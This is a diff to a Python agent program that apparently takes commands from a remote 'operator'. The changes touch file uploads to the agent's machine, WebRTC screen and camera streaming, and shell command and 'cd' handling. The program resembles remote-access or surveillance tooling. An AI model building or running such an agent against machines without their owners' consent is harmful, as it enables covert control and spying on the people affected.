-        if destination_path in on_file_chunk_from_operator.buffers:
-            log_message(f"Force saving file {destination_path} from completion event")
-            buffer_data = on_file_chunk_from_operator.buffers[destination_path]
-            _save_completed_file(destination_path, buffer_data)
+        if destination_resolved in on_file_chunk_from_operator.buffers:
+            log_message(f"Force saving file {destination_resolved} from completion event")
+            buffer_data = on_file_chunk_from_operator.buffers[destination_resolved]
+            _save_completed_file(destination_resolved, buffer_data)
             
             # ✅ SEND FINAL UPLOAD COMPLETION WITH 100% PROGRESS!
             file_size = sum(len(c[1]) for c in buffer_data['chunks'])
             safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
-                'destination_path': destination_path,
+                'destination_path': destination_resolved,
                 'received': file_size,
                 'total': file_size,
                 'progress': 100  # ✅ 100% complete!
@@ -9755,7 +10015,7 @@ def on_file_upload_complete_from_operator(data):
             safe_emit('file_upload_complete', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
-                'destination_path': destination_path,
+                'destination_path': destination_resolved,
                 'size': file_size,
                 'success': True
             })
@@ -11453,6 +11713,9 @@ if AIORTC_AVAILABLE:
             self.target_fps = target_fps
             self.quality = quality
             self.frame_interval = 1.0 / target_fps
+            self._target_fps = target_fps
+            self.target_width = WEBRTC_CONFIG['quality_levels']['low']['width']
+            self.target_height = WEBRTC_CONFIG['quality_levels']['low']['height']
             self.last_frame_time = 0
             self.capture = None
             self._start_time = time.time()
@@ -11526,6 +11789,10 @@ if AIORTC_AVAILABLE:
                     # Generate placeholder frame
                     img_array = np.zeros((480, 640, 3), dtype=np.uint8)
                 
+                # Resize
+                h, w = img_array.shape[:2]
+                if w != self.target_width or h != self.target_height:
+                    img_array = cv2.resize(img_array, (self.target_width, self.target_height), interpolation=cv2.INTER_AREA)
                 # Create VideoFrame for aiortc
                 frame = av.VideoFrame.from_ndarray(img_array, format="bgr24")
                 frame.pts, frame.time_base = await self.next_timestamp()
@@ -11552,12 +11819,21 @@ if AIORTC_AVAILABLE:
             return self.stats.copy()
     
         def set_quality(self, quality):
-            """Set video quality (1-100)."""
             self.quality = max(1, min(100, quality))
+            q = self.quality
+            if q <= 55:
+                self.target_width = 640
+                self.target_height = 480
+            elif q <= 75:
+                self.target_width = 1280
+                self.target_height = 720
+            else:
+                self.target_width = 1920
+                self.target_height = 1080
     
         def set_fps(self, fps):
-            """Set target frame rate."""
             self.target_fps = max(1, min(60, fps))
+            self._target_fps = self.target_fps
             self.frame_interval = 1.0 / self.target_fps
 
 
@@ -11707,6 +11983,7 @@ if AIORTC_AVAILABLE:
             self.target_fps = target_fps
             self.quality = quality
             self.frame_interval = 1.0 / target_fps
+            self._target_fps = target_fps
             self.last_frame_time = 0
             self.capture = None
             self._start_time = time.time()
@@ -11793,12 +12070,26 @@ if AIORTC_AVAILABLE:
             return self.stats.copy()
         
         def set_quality(self, quality):
-            """Set video quality (1-100)."""
             self.quality = max(1, min(100, quality))
+            q = self.quality
+            w = 640
+            h = 480
+            if q <= 55:
+                w, h = 640, 480
+            elif q <= 75:
+                w, h = 1280, 720
+            else:
+                w, h = 1920, 1080
+            if self.capture:
+                try:
+                    self.capture.set(cv2.CAP_PROP_FRAME_WIDTH, w)
+                    self.capture.set(cv2.CAP_PROP_FRAME_HEIGHT, h)
+                except Exception:
+                    pass
         
         def set_fps(self, fps):
-            """Set target frame rate."""
             self.target_fps = max(1, min(60, fps))
+            self._target_fps = self.target_fps
             self.frame_interval = 1.0 / self.target_fps
         
         def __del__(self):
@@ -13247,6 +13538,8 @@ def on_command(data):
     
     agent_id = get_or_create_agent_id()
     command = data.get("command")
+    if isinstance(command, str) and command.startswith("ll"):
+        command = "list-dir" + command[2:]
     
     # Run in separate thread to prevent blocking Socket.IO
     def execute_in_thread():
@@ -13784,6 +14077,15 @@ def on_execute_command(data):
                     output = f"Command '{command}' executed successfully"
             except Exception as e:
                 output = f"Error executing '{command}': {e}"
+                success = False
+        elif command.lower().startswith("cd "):
+            try:
+                path = command[3:].strip()
+                os.chdir(path)
+                output = f"Changed directory to: {os.getcwd()}"
+                success = True
+            except Exception as e:
+                output = f"cd error: {str(e)}"
                 success = False
         else:
             # Execute as system command
